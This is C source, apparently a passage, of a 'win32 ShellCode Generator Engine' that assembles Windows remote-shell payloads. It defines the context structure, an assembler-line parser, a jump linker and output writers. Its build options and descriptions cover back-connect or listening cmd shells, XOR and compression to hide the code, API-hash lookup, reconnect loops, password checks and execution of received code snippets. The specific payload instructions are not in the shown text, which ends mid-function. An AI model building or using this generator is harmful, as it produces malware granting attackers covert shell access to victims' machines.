
/* win32 ShellCode Generator Engine v1.03 */

#include "shge.h"

#define SHGE_MAX_LINES          16384
#define SHGE_EOFHDR_SIZE        1024
#define SHGE_STR_SIZE           256

#define T_INSTR                 1
#define T_COMMENT               2
#define T_VAR                   3
#define T_LABEL                 4
#define T_REL                   5
#define T_REL2                  6

#define SHGE_STREND(str)        ((str)+strlen(str))
#define SHGE_MAXADD(str,maxstrlen)   (MAX(0,(maxstrlen)-strlen(str)-8))
//#define SHGE_STRCAT(dststr,dststrmaxsize,srcstr) strncat(dststr, srcstr, SHGE_MAXADD(dststr,dststrmaxsize))

#define DB(x)                   ((unsigned char)((x)&0xFF))

#define DW(x)                   ((unsigned short)((((x)&0xFF00)>>8)|\
                                                 (((x)&0x00FF)<<8)))

#define DD(x)                   ((((x)&0xFF000000)>>24)|\
                                 (((x)&0x00FF0000)>> 8)|\
                                 (((x)&0x0000FF00)<< 8)|\
                                 (((x)&0x000000FF)<<24))

struct SHGE_CONTEXT
{

  struct SHGE_OPTIONS* opt;

  // stack && local variables
  int v_stack_size;
  int
    v_rp1, v_wp1, v_rp2, v_wp2, v_io_socket, v_listen_socket,
    v_ptr2callbyhash, v_ws2_base, v_lastcall, v_processinfo, v_alive, v_buf;

  int x_size; // used by X_PUSH/X_POP
  int struct_indent;

  // binary(instruction) and source lines
  int l_count;
  int           l_type[SHGE_MAX_LINES];      // T_xxx
  int           l_size[SHGE_MAX_LINES];      // opcodes -- size
  unsigned char l_data[SHGE_MAX_LINES][32];  // opcodes -- data
  unsigned long l_offs[SHGE_MAX_LINES];      // offset (set on link stage 1)
  char*         l_cmd [SHGE_MAX_LINES];      // cmd or var or label name
  char*         l_arg1[SHGE_MAX_LINES];      // arg1 or label name or var value
  char*         l_arg2[SHGE_MAX_LINES];      // arg2
  char*         l_comm[SHGE_MAX_LINES];      // comment

  // compression
  unsigned long* ss11_len;
  unsigned long* ss12_len;
  unsigned char*  mem1;
  unsigned char*  mem2;
  unsigned long*c_hash_max;
  unsigned long*c_hash_cnt;
  unsigned long**c_hash_ptr;
  unsigned long**c_hash_len;    // used only if BEST2
  unsigned long*c_off;
  unsigned long*c_len;
  unsigned long*c_pak;
  unsigned long*c_lmo;
  unsigned long*c_prv;
  unsigned long*c_nxt;

  // labels

  char l___call_by_hash__      [256];
  char l___kb_cycle1__         [256];
  char l___kb_cycle2__         [256];
  char l___fb_start_1__        [256];
  char l___fb_start_2__        [256];
  char l___fb_cycle_1__        [256];
  char l___fb_cycle_2__        [256];
  char l___kb_found__          [256];
  char l___kb_win9x__          [256];
  char l___base_found__        [256];
  char l___search_cycle__      [256];
  char l___calc_hash__         [256];
  char l___name_found__        [256];
  char l___sw_retry__          [256];
  char l___sw_socket_ok__      [256];
  char l___mtx_pushed__        [256];
  char l___mtx_start__         [256];
  char l___varp_pop__          [256];
  char l___pop_th__            [256];
  char l___reconnect__         [256];
  char l___connected__         [256];
  char l___create_pipe__       [256];
  char l___si_fill_cycle__     [256];
  char l___rs_win9X__          [256];
  char l___rs_pushed__         [256];
  char l___sh_cycle__          [256];
  char l___sh_readsocket__     [256];
  char l___sh_sizeok__         [256];
  char l___xor_cycle_1__       [256];
  char l___xor_cycle_2__       [256];
  char l___restart_main__      [256];
  char l___init_seh__          [256];
  char l___pop_ptr2callbyhash__[256];
  char l___pop_ptr2callbyhash__th__[256];
  char l___pushed__            [256];
  char l___pushed__th__        [256];
  char l___create_socket__     [256];
  char l___accept__            [256];
  char l___end_io_socket__     [256];
  char l___thread__            [256];
  char l___init_seh__th__      [256];
  char l___end_thread__        [256];
  char l___exec_shell__        [256];
  char l___shell_cycle__       [256];
  char l___end_shell__         [256];
  char l___kill_shell__        [256];
  char l___unxor_pop_esi__     [256];
  char l___unxor_data__        [256];
  char l___unxor_cycle__       [256];
  char l___pop_packed__        [256];
  char l___pop_getbit__        [256];
  char l___x1__                [256];
  char l___decompr_literals_n2b__[256];
  char l___loop1_n2b__         [256];
  char l___loopend1_n2d__      [256];
  char l___decompr_ebpeax_n2b__[256];
  char l___q1__                [256];
  char l___decompr_end_n2b__   [256];
  char l___decompr_got_mlen_n2b__[256];
  char l___loop2end__          [256];
  char l___q3__                [256];
  char l___decompr_loop_n2b__  [256];
  char l___loop2_n2b__         [256];
  char l___crc32a__            [256];
  char l___crc32b__            [256];
  char l___init__              [256];
  char l___tempghbn__          [256];
  char l___conn_fault__        [256];
  char l___findbase__          [256];
  char l___sh_cycle_save__     [256];
  char l___pop_prompt__        [256];
  char l___pop_pass__          [256];
  char l___pop_snippet__       [256];
  char l___end_snippet_1__     [256];
  char l___end_snippet_2__     [256];
  char l___end_snippet_3__     [256];
  char l___snippet_cycle__     [256];
  char l___rcvd_snippet__      [256];

  char x_rp1                   [256];
  char x_rp2                   [256];
  char x_wp1                   [256];
  char x_wp2                   [256];
  char x_io_socket             [256];
  char x_listen_socket         [256];
  char x_ptr2callbyhash        [256];
  char x_ws2_base              [256];
  char x_lastcall              [256];
  char x_processinfo           [256];
  char x_buf                   [256];
  char x_alive                 [256];

  char c_stack_size            [256];
  char c_MAXBUFSIZE            [256];
  char c_K32_ID                [256];
  char c_WS2_ID                [256];
  char c_RECONNECT_MS          [256];
  char c_XORBYTE               [256];
  char c_IP_ADDR               [256];
  char c_SHELL_PORT            [256];
  char c_INACTIVITY            [256];

  char m_callK32               [256];
  char m_callWS2               [256];

  char a_K32_GlobalAlloc              [256];
  char a_K32_GlobalFree               [256];
  char a_K32_CreateThread             [256];
  char a_K32_CloseHandle              [256];
  char a_K32_CreatePipe               [256];
  char a_K32_CreateProcessA           [256];
  char a_K32_GetExitCodeProcess       [256];
  char a_K32_PeekNamedPipe            [256];
  char a_K32_ReadFile                 [256];
  char a_K32_WriteFile                [256];
  char a_K32_TerminateProcess         [256];
  char a_K32_ExitThread               [256];
  char a_K32_CreateMutexA             [256];
  char a_K32_GetLastError             [256];
  char a_K32_Sleep                    [256];
  char a_K32_LoadLibraryA             [256];
  char a_K32_GetVersion               [256];
  char a_K32_WaitForSingleObject      [256];
  char a_K32_GetTickCount             [256];
//  char a_K32_GetProcAddress           [256];

  char a_WS2_WSAStartup               [256];
  char a_WS2_socket                   [256];
  char a_WS2_setsockopt               [256];
  char a_WS2_closesocket              [256];
  char a_WS2_connect                  [256];
  char a_WS2_gethostbyname            [256];
  char a_WS2_select                   [256];
  char a_WS2_bind                     [256];
  char a_WS2_listen                   [256];
  char a_WS2_accept                   [256];
  char a_WS2_send                     [256];
  char a_WS2_recv                     [256];

}; /* struct SHGE_CONTEXT */

void add_src(struct SHGE_CONTEXT* ctx, char* fmt, ...)
{
  char t[SHGE_STR_SIZE];
  va_list va;

  va_start(va, fmt);
  vsnprintf(t, sizeof(t)-1, fmt, va);
  va_end(va);

  ctx->opt->out_src_size += snprintf(
     ctx->opt->out_src + ctx->opt->out_src_size,
     ctx->opt->out_src_maxsize - ctx->opt->out_src_size - SHGE_EOFHDR_SIZE,
     "%s\r\n",
     t);

} // add_src

void add_hpp(struct SHGE_CONTEXT* ctx, char* fmt, ...)
{
  char t[SHGE_STR_SIZE];
  va_list va;

  va_start(va, fmt);
  vsnprintf(t, sizeof(t)-1, fmt, va);
  va_end(va);

  ctx->opt->out_hpp_size += snprintf(
     ctx->opt->out_hpp + ctx->opt->out_hpp_size,
     ctx->opt->out_hpp_maxsize - ctx->opt->out_hpp_size - SHGE_EOFHDR_SIZE,
           "%s\r\n",
           t);

} // add_hpp

void add_struct(struct SHGE_CONTEXT* ctx, char* fmt, ...)
{
  int i;
  char t[SHGE_STR_SIZE];
  va_list va;

  if (strchr(fmt,'}')) ctx->struct_indent--;

  i = ctx->struct_indent*2;
  memset(t,32,i);
  t[i]=0;

  va_start(va, fmt);
  vsnprintf(t+i, sizeof(t)-1-i, fmt, va);
  va_end(va);

  ctx->opt->out_struct_size += snprintf(
     ctx->opt->out_struct + ctx->opt->out_struct_size,
     ctx->opt->out_struct_maxsize - ctx->opt->out_struct_size - SHGE_EOFHDR_SIZE,
           "%s\r\n",
           t);

  if (strchr(fmt,'{')) ctx->struct_indent++;

} // add_struct

void* my_malloc(struct SHGE_CONTEXT* ctx, int size)
{
  void* t;
  ctx->opt->mem_used += size;
  ctx->opt->mem_used_max = MAX(ctx->opt->mem_used_max, ctx->opt->mem_used);
  t = (void*)malloc(size+4);
  *(unsigned long*)t = size;
  return (void*)((unsigned long)t + 4);
}

void my_free(struct SHGE_CONTEXT* ctx, void* block)
{
  block = (void*)((unsigned long)block - 4);
  ctx->opt->mem_used -= *(unsigned long*)block;
  free(block);
}

char* my_strdup(struct SHGE_CONTEXT* ctx, char* str)
{
  char* t = my_malloc(ctx, strlen(str)+1);
  strcpy(t, str);
  return t;
}

//

void padd(char* dst, int p)
{
  int n_space, dst_len;
  dst_len = strlen(dst);
  n_space = MAX(1, p - dst_len);
  memset(dst+dst_len, 32, n_space);
  dst_len += n_space;
  dst[dst_len] = 0;
} /* padd */

void add_c_str(struct SHGE_CONTEXT* ctx, char* v_name, char* v_value, char* v_comm)
{
  //assert(ctx->l_count < SHGE_MAX_LINES);

  ctx->l_type[ctx->l_count] = T_VAR;
  ctx->l_size[ctx->l_count] = 0;
  ctx->l_cmd [ctx->l_count] = (char*)my_strdup(ctx,v_name);
  ctx->l_arg1[ctx->l_count] = (char*)my_strdup(ctx,v_value);
  ctx->l_arg2[ctx->l_count] = NULL;
  ctx->l_comm[ctx->l_count] = v_comm==NULL?NULL:(char*)my_strdup(ctx,v_comm);

  ctx->l_count++;
} /* add_c_str */

//char* pfxz(unsigned long v)
//{
//  unsigned long t;
//  t = v;
//  while(t>=0x10) t>>=4;
//  return t>=0xA?"0":"";
//}

char* hex_num(struct SHGE_CONTEXT* ctx, unsigned long v_value, int n)
{
  char t[32];
  static char s[SHGE_STR_SIZE];
  unsigned long v;
  int n2;

  v = v_value;
  n2 = n;
  if (n2 == 0)
    while(v >= 0x10) v >>= 4;
  else
  {
    n2--;
    while(n2--) v >>= 4;
  }

  if (v_value <= 9)
    sprintf(s,"%d",v_value);
  else
  {
    if (ctx->opt->SYNTAX == 1) // NASM
    {
      if (n == 0)
        sprintf(s, "0x%X", v_value);
      else
      {
        sprintf(t, "0x%%0%dX", n);
        sprintf(s, t, v_value);
      }
    }
    else // TASM,MASM
    {
      if (n == 0)
        strcpy(t, "%s%Xh");
      else
        sprintf(t, "%%s%%0%dXh", n);
      sprintf(s, t, (v>=0x0A)?"0":"", v_value);
    }
  }

  return s;
} /* hex_num */

void add_c(struct SHGE_CONTEXT* ctx, char* v_name, unsigned long v_value, char* v_comm, int n)
{
  char s[SHGE_STR_SIZE];
  char q[SHGE_STR_SIZE];

  if (n == -1)
  {
    sprintf(s, "%d", v_value);
    q[0] = 0;
  }
  else
  {
    strcpy(s, hex_num(ctx, v_value, n));
    sprintf(q, "== %d", v_value);
  }

  add_c_str(ctx, v_name, s, v_comm?v_comm:q);

} /* add_c */

/* add local variable */
/* return ebp-relative offset */

int add_v(struct SHGE_CONTEXT* ctx, char* v_name, char* v_type, int v_size)
{
  char s[SHGE_STR_SIZE];

  ctx->v_stack_size += v_size;

  snprintf(s, sizeof(s)-1, "type=%s, size=%d", v_type, v_size);
  //ctx->l_comm[ctx->l_count] = (char*)my_strdup(ctx,s);

  add_c(ctx, v_name, ctx->v_stack_size, s, 0);

  return ctx->v_stack_size;
} /* add_v */

/* add instruction or label */

/* HH[HH[..]]|cmd[ arg1[,arg2]][;comment]       */
/* label:[;comment]                             */
/* <jXX]|call> label[;comment]                  */

void replace(struct SHGE_CONTEXT* ctx, char* s, char* s1, char* s2)
{
  char *x, t[SHGE_STR_SIZE];

  x = (char*)strstr(s,s1);
  if (x)
  {
    *x = 0;
    sprintf(t, "%s%s%s", s, s2, x+strlen(s1));
    strcpy(s, t);
  }

} // replace

void add(struct SHGE_CONTEXT* ctx, char* fmt, ...)
{
  char t[SHGE_STR_SIZE];
  char *s, *x;
  va_list va;

  //assert(ctx->l_count < SHGE_MAX_LINES);

  /* format string */

  va_start(va, fmt);
  vsnprintf(t, sizeof(t)-1, fmt, va);
  va_end(va);
  s = t;

  if (ctx->opt->SYNTAX == 0)  // tasm, masm
  {
    replace(ctx, t, "$DP", "dword ptr");
    replace(ctx, t, "$WP", "word ptr");
    replace(ctx, t, "$BP", "byte ptr");
  }
  else                        // nasm
  {
    replace(ctx, t, "$DP", "dword");
    replace(ctx, t, "$WP", "word");
    replace(ctx, t, "$BP", "byte");
  }

  /* init */

  ctx->l_type[ctx->l_count] = 0;
  ctx->l_size[ctx->l_count] = 0;
  ctx->l_cmd [ctx->l_count] = NULL;
  ctx->l_arg1[ctx->l_count] = NULL;
  ctx->l_arg2[ctx->l_count] = NULL;
  ctx->l_comm[ctx->l_count] = NULL;

  /* check comment */

  x = (char*)strchr(s, ';');
  ctx->l_comm[ctx->l_count] = x ? (char*)my_strdup(ctx,x+1) : (char*)NULL;
  if (x != NULL) *x = 0;

  // check if empty string

  if (s[0] == 0)
  {
    ctx->l_type[ctx->l_count] = T_COMMENT;
  }
  else
  {

    // check if label

    x = (char*)strchr(s, ':');
    if (strchr(s,'|')) x=NULL;
    if (x != NULL)
    {
      *x = 0;
      ctx->l_type[ctx->l_count] = T_LABEL;
      ctx->l_cmd [ctx->l_count] = (char*)my_strdup(ctx,s);
    }
    else
    {

      // check if jxx/call/loop

      if ( (s[0]=='j')||
           (s[0]=='c'&&s[1]=='a'&&s[2]=='l'&&s[3]=='l')||
           (s[0]=='l'&&s[1]=='o'&&s[2]=='o'&&s[3]=='p'))
      {
        x = (char*)strchr(s,32);
        //assert(x != NULL);
        *x++ = 0;
        ctx->l_type[ctx->l_count] = T_REL;
        ctx->l_cmd [ctx->l_count] = (char*)my_strdup(ctx,s);  // jxx/call/loop
        ctx->l_arg1[ctx->l_count] = (char*)my_strdup(ctx,x);  // label
      }
      else
      {

        // its instruction, parse hexes

        ctx->l_type[ctx->l_count] = T_INSTR;

        x = (char*)strchr(s,'|');
        //if (!x) printf("%s\n",s);
        //assert(x);
        *x++ = 0;

        while(*s)
        {
          sscanf(s,"%02X", &ctx->l_data[ctx->l_count][ctx->l_size[ctx->l_count]++]);
          strcpy(s, s+2);
        }

        // cmd

        s = x; x = (char*)strchr(s,32); if (x != NULL) *x++ = 0;

        ctx->l_cmd[ctx->l_count] = (char*)my_strdup(ctx,s);

        if (x != NULL) // there is arg1 and/or arg2
        {
          s = x; while(*s==32) s++; x = (char*)strchr(s,','); if (x != NULL) *x++ = 0;

          ctx->l_arg1[ctx->l_count] = (char*)my_strdup(ctx,s);

          if (x != NULL) // arg2
          {
            while(*x==32) x++;
            ctx->l_arg2[ctx->l_count] = (char*)my_strdup(ctx,x);
          }

        }

      } // not jxx/call

    } // not label

  } // not empty string

  ctx->l_count++;

} // add

void freelines(struct SHGE_CONTEXT* ctx)
{
  int i;
  // free src lines
  for(i=0; i<ctx->l_count; i++)
  {
    if (ctx->l_cmd [i] != NULL) my_free(ctx,(void*)ctx->l_cmd [i]);
    if (ctx->l_arg1[i] != NULL) my_free(ctx,(void*)ctx->l_arg1[i]);
    if (ctx->l_arg2[i] != NULL) my_free(ctx,(void*)ctx->l_arg2[i]);
    if (ctx->l_comm[i] != NULL) my_free(ctx,(void*)ctx->l_comm[i]);
  }
  ctx->l_count = 0;
}

void freectx(struct SHGE_CONTEXT* ctx)
{
  if (ctx != NULL)
  {
    freelines(ctx);
  }
} // freectx

void link(struct SHGE_CONTEXT* ctx)
{
  int i,j;
  long k, sh_sz;

  do   // its like TASM's /m option -- minimize jmps
  {

    // link -- stage 1 of 2 -- calculate offsets && summary size

    sh_sz = 0;

    for(i=0; i<ctx->l_count; i++)
    {
      if ((ctx->l_type[i] == T_REL) || (ctx->l_type[i] == T_REL2))
      {
        if (ctx->l_cmd[i][0] == 'j')
        {
          if (!stricmp(ctx->l_cmd[i], "JO"  )) j = 0;
          if (!stricmp(ctx->l_cmd[i], "JNO" )) j = 1;
          if (!stricmp(ctx->l_cmd[i], "JB"  )) j = 2;
          if (!stricmp(ctx->l_cmd[i], "JNAE")) j = 2;
          if (!stricmp(ctx->l_cmd[i], "JNB" )) j = 3;
          if (!stricmp(ctx->l_cmd[i], "JAE" )) j = 3;
          if (!stricmp(ctx->l_cmd[i], "JC"  )) j = 2;
          if (!stricmp(ctx->l_cmd[i], "JNC" )) j = 3;
          if (!stricmp(ctx->l_cmd[i], "JE"  )) j = 4;
          if (!stricmp(ctx->l_cmd[i], "JZ"  )) j = 4;
          if (!stricmp(ctx->l_cmd[i], "JNE" )) j = 5;
          if (!stricmp(ctx->l_cmd[i], "JNZ" )) j = 5;
          if (!stricmp(ctx->l_cmd[i], "JBE" )) j = 6;
          if (!stricmp(ctx->l_cmd[i], "JNA" )) j = 6;
          if (!stricmp(ctx->l_cmd[i], "JNBE")) j = 7;
          if (!stricmp(ctx->l_cmd[i], "JA"  )) j = 7;
          if (!stricmp(ctx->l_cmd[i], "JS"  )) j = 8;
          if (!stricmp(ctx->l_cmd[i], "JNS" )) j = 9;
          if (!stricmp(ctx->l_cmd[i], "JP"  )) j = 10;
          if (!stricmp(ctx->l_cmd[i], "JPE" )) j = 10;
          if (!stricmp(ctx->l_cmd[i], "JNP" )) j = 11;
          if (!stricmp(ctx->l_cmd[i], "JPO" )) j = 11;
          if (!stricmp(ctx->l_cmd[i], "JL"  )) j = 12;
          if (!stricmp(ctx->l_cmd[i], "JNGE")) j = 12;
          if (!stricmp(ctx->l_cmd[i], "JNL" )) j = 13;
          if (!stricmp(ctx->l_cmd[i], "JGE" )) j = 13;
          if (!stricmp(ctx->l_cmd[i], "JLE" )) j = 14;
          if (!stricmp(ctx->l_cmd[i], "JNG" )) j = 14;
          if (!stricmp(ctx->l_cmd[i], "JNLE")) j = 15;
          if (!stricmp(ctx->l_cmd[i], "JG"  )) j = 15;

          if (ctx->l_type[i] == T_REL)
          {
            ctx->l_size[i] = 2;
            if (!stricmp(ctx->l_cmd[i], "jmp"))
              ctx->l_data[i][0] = 0xEB;
            else
              ctx->l_data[i][0] = 0x70 | j;
          }
          else
          {
            if (!stricmp(ctx->l_cmd[i], "jmp"))
            {
              ctx->l_size[i] = 5;
              ctx->l_data[i][0] = 0xE9;
            }
            else
            {
              ctx->l_size[i] = 6;
              ctx->l_data[i][0] = 0x0F;
              ctx->l_data[i][1] = 0x80 | j;
            }
          }
        }
        else
        if (ctx->l_cmd[i][0] == 'l') /* loop */
        {
          // note: loop cant be currently expanded, so dont make loop's
          // which can become NEAR
          ctx->l_size[i] = 2;
          ctx->l_data[i][0] = 0xE2;
        }
        else /* call */
        {
          ctx->l_size[i] = 5;
          ctx->l_data[i][0] = 0xE8;
        }
      } // T_REL || T_REL2
      ctx->l_offs[i] = sh_sz;
      sh_sz += ctx->l_size[i];
    }

    // link -- stage 2 of 2 -- fix relative jmps

    for(i=0; i<ctx->l_count; i++)
    {
      if ((ctx->l_type[i] == T_REL) || (ctx->l_type[i] == T_REL2))
      {
        k = -1;
        for(j=0; j<ctx->l_count; j++)
        if (ctx->l_type[j] == T_LABEL)
          if (!strcmp(ctx->l_arg1[i], ctx->l_cmd[j]))
          {
            k = j;
            break;
          }
        //assert(k != -1);

        k = ctx->l_offs[k] - (ctx->l_offs[i] + ctx->l_size[i]);

        if ((ctx->l_size[i] == 2) && ((k < -128) || (k > 127)))
        {
          // what a sux, this rel.jump should be NEAR instead of SHORT,
          // so we will restart link from stage 1
          ctx->l_type[i] = T_REL2;
          sh_sz = 0;
          break;
        }

        if (ctx->l_size[i] == 2)
          *(char*)&ctx->l_data[i][ctx->l_size[i]-1] = (char)k;
        else
          *(long*)&ctx->l_data[i][ctx->l_size[i]-4] = (long)k;

      }
    }

  } while(sh_sz == 0);

} // link

int build_bin(struct SHGE_CONTEXT* ctx)
{
  int i,j;

  ctx->opt->out_bin_size = 0;

  for(i=0; i<ctx->l_count; i++)
  {
    for(j=0; j<ctx->l_size[i]; j++)
    {
      if (ctx->opt->out_bin_size >= ctx->opt->out_bin_maxsize)
        return SHGE_ERR_NOSPACE_BIN;
      ctx->opt->out_bin[ctx->opt->out_bin_size++] = ctx->l_data[i][j];
    }
  }

  return SHGE_RES_OK;

} // build_bin

void add_descr(struct SHGE_CONTEXT* ctx, char* fmt, ...)
{
  char t[SHGE_STR_SIZE];
  va_list va;

  va_start(va, fmt);
  vsnprintf(t, sizeof(t)-1, fmt, va);
  va_end(va);

  add_src(ctx, "; %s", t);

  padd(t, ctx->opt->POS_HPP_COMMENT_SIZE);

  add_hpp(ctx, "/* %s */", t);

} // add_descr

int build_srchpp(struct SHGE_CONTEXT* ctx)
{
  char s[SHGE_STR_SIZE], q[SHGE_STR_SIZE];
  int i,j,q_len,s_len;
  long k;

  ctx->opt->out_src[0]   = 0;
  ctx->opt->out_src_size = 0;
  ctx->opt->out_hpp[0]   = 0;
  ctx->opt->out_hpp_size = 0;

  // src - header

  q[0] = 0;
  padd(q, ctx->opt->POS_INSTR);

  //

  add_descr(ctx,"generated by win32 shellcode constructor (engine version " SHGE_VERSION ")");
  add_descr(ctx,"shellcode parameters:");

  if (ctx->opt->BC2HOST && ctx->opt->BACKCONNECT)
  {
    add_descr(ctx,"  + %s hostname = %s:%d",
      ctx->opt->BACKCONNECT ? "back-connect to":"listen on",
      ctx->opt->str_host,
      (ctx->opt->SHELL_PORT) );
  }
  else
  {
    add_descr(ctx,"  + %s IP = %d.%d.%d.%d:%d",
      ctx->opt->BACKCONNECT ? "back-connect to":"listen on",
      (ctx->opt->IP_ADDR>> 0)&0xFF,
      (ctx->opt->IP_ADDR>> 8)&0xFF,
      (ctx->opt->IP_ADDR>>16)&0xFF,
      (ctx->opt->IP_ADDR>>24)&0xFF,
      (ctx->opt->SHELL_PORT) );
  }

  if (ctx->opt->VAR_PORT)
  {
    add_descr(ctx,"  + variable port, %d-->%d-->%d-->..., cycle in range [%d..%d]",
      ctx->opt->SHELL_PORT,
      (ctx->opt->SHELL_PORT&0xFF00)| ((ctx->opt->SHELL_PORT+1)&0xFF),
      (ctx->opt->SHELL_PORT&0xFF00)| ((ctx->opt->SHELL_PORT+2)&0xFF),
      ctx->opt->SHELL_PORT&0xFF00,
      ctx->opt->SHELL_PORT|0xFF );
  }

  if (ctx->opt->USE_SEH)
    add_descr(ctx,"  + using seh");

  if (ctx->opt->BACKCONNECT)
  {
    add_descr(ctx,"  + reconnect each %d ms", ctx->opt->RECONNECT_MS);
  }
  else
  {
    if (ctx->opt->MULTITHREAD)
      add_descr(ctx,"  + multithread");
    if (ctx->opt->USE_SEH_TH)
      add_descr(ctx,"  + using seh for each thread");
    if (ctx->opt->DO_REUSEADDR)
      add_descr(ctx,"  + using setsockopt(SO_REUSEADDR)");
  }

  if (!ctx->opt->NOSHELL)
  if (ctx->opt->DONT_DROP)
    add_descr(ctx,"  + dont-drop mode");

  add_descr(ctx,"  + io buffer size = %d bytes", ctx->opt->MAXBUFSIZE);

  if (ctx->opt->USE_MUTEX)
    add_descr(ctx,"  + using mutex '%s'", ctx->opt->str_mutex);

  if (ctx->opt->SUPPORT_WIN9X)
  {
    if (ctx->opt->NOSHELL)
      add_descr(ctx,"  + winNT/win9x, cmd shell is not used");
    else
      add_descr(ctx,"  + winNT/win9x (shell='%s'/'%s')", ctx->opt->str_cmd, ctx->opt->str_command);
  }
  else
  {
    if (ctx->opt->NOSHELL)
      add_descr(ctx,"  + winNT-only, cmd shell is not used");
    else
      add_descr(ctx,"  + winNT-only (shell='%s')", ctx->opt->str_cmd);
  }

  add_descr(ctx,"  + loads '%s' library to use sockets", ctx->opt->str_ws2);

  if (ctx->opt->USE_OLDWAY_2FIND_K32)
    add_descr(ctx,"  + use old way to find k32 base");

  if (ctx->opt->DIRECT_API)
  {
    add_descr(ctx,"  + use hardcoded api addresses");
  }
  else
  {
    add_descr(ctx,"  + use api hashs to find api addresses");
    if (ctx->opt->USE_LASTCALL)
      add_descr(ctx,"  + after each api call, ESI = last api address");
    add_descr(ctx,"  + \"OR EAX,EAX\" is done before retn from api call");
    add_descr(ctx,"  + using 0x%02X/0x%02X id's for K32/WS2 api cals",
      ctx->opt->K32_ID,
      ctx->opt->WS2_ID );
    add_descr(ctx,"  + using %s hash function",
      ctx->opt->HASHTYPE==0?"ROL-7":
      (ctx->opt->HASHTYPE==1?"~CRC32":"CRC32"));
  }

  if (ctx->opt->ALLOC_BUF)
    add_descr(ctx,"  + io buffer is managed using GlobalAlloc/GlobalFree");

  if (ctx->opt->XORBYTE)
    add_descr(ctx,"  + io stream is xor'ed by 0x%02X", ctx->opt->XORBYTE);

  if (ctx->opt->USE_XPUSH_STRINGS)
    add_descr(ctx,"  + use \"X_PUSH\" strings");

  if (ctx->opt->DO_WSA_STARTUP)
    add_descr(ctx,"  + do WSAStartup() if required");

  if (ctx->opt->COMPRESSED)
    add_descr(ctx,"  + compressed%s, parameters=%d,%d,%d,%d,%d",
      ctx->opt->BEST ? " (max ratio)":
      (ctx->opt->BEST2 ? " (max ratio/mode 2)":""),
      ctx->opt->P1,
      ctx->opt->P2,
      ctx->opt->P3,
      ctx->opt->P4,
      ctx->opt->P5 );

  if (ctx->opt->XORED)
    add_descr(ctx,"  + xored, to hide \"\\r\\n%s\\0\" chars", ctx->opt->HIDE);

  if (ctx->opt->INACT != 0)
    add_descr(ctx,"  + disconnect on inactivity_timeout reached");

  if (ctx->opt->PROMPT)
    add_descr(ctx,"  + show prompt: %s", ctx->opt->str_prompt);
  if (ctx->opt->AUTH)
    add_descr(ctx,"  + checking password: %s", ctx->opt->str_auth);
  if (ctx->opt->SNIPPET)
    add_descr(ctx,"  + check/exec code snippets, prefix: %s", ctx->opt->str_snippet);

  //

  if (ctx->opt->SYNTAX == 0)
  {
    add_src(ctx, "%s.386", q);
    add_src(ctx, "%s.model  flat", q);
    add_src(ctx, "%sassume  fs:FLAT", q);
    add_src(ctx, "%s.code", q);
    add_src(ctx, "%sdb      '$START$'", q);
    add_src(ctx, "%spublic  _start", q);
    add_src(ctx, "_start:");
    add_src(ctx, ";--- shellcode src begin ---");
  }
  else
  {
    add_src(ctx, "%sBITS    32", q);
    add_src(ctx, "_start:");
    add_src(ctx, ";--- shellcode src begin ---");
  }

  // hpp - header

  if (ctx->opt->SH_SIZE)
  {
    add_hpp(ctx,
             "#define shellcode_size %d /* == 0x%08X */",
             ctx->opt->out_bin_size,
             ctx->opt->out_bin_size );
  }

  if (ctx->opt->HPP_TYPE)
  {
    add_hpp(ctx, "unsigned char shellcode[] =");
    add_hpp(ctx, "{");
  }
  else
  {
    add_hpp(ctx, "char* shellcode =");
  }

  k = 0;
  for(i=0; i<ctx->l_count; i++)
  {
    s[0] = 0;
    s_len = 0;

    if ((ctx->l_cmd[i] != NULL) && (ctx->l_cmd[i][0] != 0))
    {

      if ((ctx->opt->SYNTAX == 1) && (ctx->l_type[i] == T_VAR))
      {
        strcat(s, "%define");
        padd(s, ctx->opt->POS_INSTR);
        strcat(s, ctx->l_cmd[i]);
        padd(s, ctx->opt->POS_ARG1);
        strcat(s, ctx->l_arg1[i]);
      }
      else
      {

        if (ctx->l_type[i] == T_INSTR ||
            ctx->l_type[i] == T_REL   ||
            ctx->l_type[i] == T_REL2)
          padd(s, ctx->opt->POS_INSTR);

        strcat(s, ctx->l_cmd[i]);

        if (ctx->l_type[i] == T_LABEL)
        {
          strcat(s, ":");
        }
        else
        if (ctx->l_type[i] == T_VAR)
        {
          padd(s, ctx->opt->POS_INSTR);
          strcat(s, "= ");
          strcat(s, ctx->l_arg1[i]);
        }
        else
        if (ctx->l_arg1[i] != NULL)
        {
          padd(s, ctx->opt->POS_ARG1);

          if (ctx->opt->SYNTAX == 1) // stupid nasm
          if ((ctx->l_type[i] == T_REL) || (ctx->l_type[i] == T_REL2))
          {
            if (ctx->l_size[i] == 2) strcat(s, "short ");
            if (ctx->l_size[i] > 2)  strcat(s, "near ");
          }

          strcat(s, ctx->l_arg1[i]);
          if (ctx->l_arg2[i] != NULL)
          {
            strcat(s, ", ");
            strcat(s, ctx->l_arg2[i]);
          }
        }

      }

    } // cmd

    if (ctx->l_comm[i] != NULL)
    if (ctx->opt->CMT_SRC || (ctx->l_comm[i][0]=='$'))
    {
      if (ctx->l_type[i] != T_COMMENT)
        padd(s, ctx->opt->POS_COMM);
      if (ctx->l_comm[i][0] == '$')
      {
        strcat(s, ctx->l_comm[i]+1);
      }
      else
      {
        strcat(s, "; ");
        strcat(s, ctx->l_comm[i]);
      }
    }

    // src

    if (s[0]) // skip empty line
    {
      add_src(ctx, "%s", s);
    }

    if (ctx->opt->out_src_size >= ctx->opt->out_src_maxsize - SHGE_EOFHDR_SIZE)
      return SHGE_ERR_NOSPACE_SRC;

    // hpp

    q[0] = 0;
    q_len = 0;

    if (ctx->opt->HPP_OFF)
    {
      if ( (ctx->opt->CMT_HPP&&(s[0]!=0)) ||(ctx->l_size[i]!=0))
      {
        q_len += sprintf(q+q_len,"/* %08X */  ",ctx->l_offs[i]);
      }
    } // HPP_OFF

    if (ctx->l_size[i] != 0)
    {
      if (!ctx->opt->HPP_TYPE)
        q_len += sprintf(q+q_len, "\"");
      for(j=0; j<ctx->l_size[i]; j++)
      {
        q_len += sprintf(q+q_len,
          "%s%02X%s",
          ctx->opt->HPP_TYPE?"0x":"\\x",
          ctx->l_data[i][j],
            ( ctx->opt->HPP_TYPE &&
              (k<ctx->opt->out_bin_size-1) ) ? ",":"" );
        k++;
      }
      if (!ctx->opt->HPP_TYPE)
        q_len += sprintf(q+q_len, "\"");
    }

    if ((ctx->opt->CMT_HPP&&s[0]) || q[0]) // skip empty line
    {
      if (ctx->opt->CMT_HPP)
      {
        padd(q, ctx->opt->POS_HPP_COMMENT);
